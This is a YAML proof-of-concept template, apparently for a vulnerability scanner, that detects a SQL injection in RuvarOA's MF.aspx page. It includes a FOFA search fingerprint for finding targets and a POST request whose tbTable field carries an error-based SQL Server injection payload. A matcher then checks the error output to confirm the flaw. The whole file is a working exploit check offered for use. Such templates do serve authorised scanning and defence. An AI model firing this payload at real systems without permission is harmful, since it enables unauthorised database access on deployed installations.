id: poc-yaml-ruvaroa-mf-aspx-sqli
info:
  name: RuvarOA MF.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ruvar-oa
  fofa: body="txt_admin_key"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /WebUtility/MF.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: __VIEWSTATE=%2FwEPDwUKMTQzODQ2ODU2NGRkIOnIdBvx8FdC98ZQVziWZAsTeOJOxTvwmwGbcAdrOUw%3D&tbTable=1'+and+(select+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))>0+--+&tbPageID=1&btnMake=%E7%94%9F%E6%88%90%E8%AF%AD%E5%8F%A5&tbSql=
  expression: "status_code == 500 && \ncontains(body,\"ORDINAL_POSITION\") &&\ncontains(body,\"\
    0x\" + t2) &&\ncontains(body,\"转换成数据类型 int 时失败\")\n"
transport: http
